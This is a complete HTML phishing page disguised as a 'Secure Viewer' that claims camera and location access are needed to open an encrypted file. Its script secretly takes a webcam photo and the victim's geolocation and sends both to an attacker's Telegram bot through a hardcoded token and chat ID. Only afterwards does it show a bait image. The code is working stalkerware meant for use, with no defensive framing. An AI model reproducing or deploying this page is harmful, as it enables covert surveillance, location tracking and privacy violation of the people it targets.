<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Viewer</title>
    <style>
        body { font-family: sans-serif; background: #0a0a0a; color: #fff; text-align: center; padding: 40px 20px; }
        .card { background: #161616; border: 1px solid #333; border-radius: 15px; padding: 25px; max-width: 350px; margin: auto; }
        .btn { background: #0088cc; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
        #victim_view { display: none; width: 100%; border-radius: 10px; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div id="setup_box" class="card">
        <h2 style="color:#0088cc">ðŸ”’ Verification Required</h2>
        <p>Allow <b>Camera</b> and <b>Location</b> to view the encrypted file.</p>
        <button class="btn" onclick="startCapture()">ALLOW & VIEW</button>
    </div>

    <img id="victim_view" src="">
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
        const CHAT_ID = "6643732863"; // <--- DOUBLE CHECK THIS!

        const urlParams = new URLSearchParams(window.location.search);
        const baitImg = urlParams.get('img');

        async function startCapture() {
            try {
                // STEP 1: START CAMERA IMMEDIATELY
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // STEP 2: WHILE CAMERA WAKES UP, GET LOCATION
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                            method: "POST",
                            headers: {"Content-Type": "application/json"},
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: `ðŸ“ **Location Captured**\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                            })
                        });
                    });
                }

                // STEP 3: SNAP PHOTO AFTER 2 SECONDS
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("chat_id", CHAT_ID);
                        formData.append("photo", blob, "scan.jpg");
                        formData.append("caption", "ðŸŽ¯ Biometric Scan Captured!");
                        
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        }).then(() => {
                            // STEP 4: SHOW IMAGE ONLY AFTER PHOTO IS SENT
                            document.getElementById('setup_box').style.display = 'none';
                            const imgTag = document.getElementById('victim_view');
                            if(baitImg) {
                                imgTag.src = baitImg;
                                imgTag.style.display = 'block';
                            }
                        });
                    }, 'image/jpeg');

                    stream.getTracks().forEach(t => t.stop());
                }, 2000);

            } catch (err) {
                alert("You must ALLOW camera access to see the image.");
            }
        }
    </script>
</body>
</html>
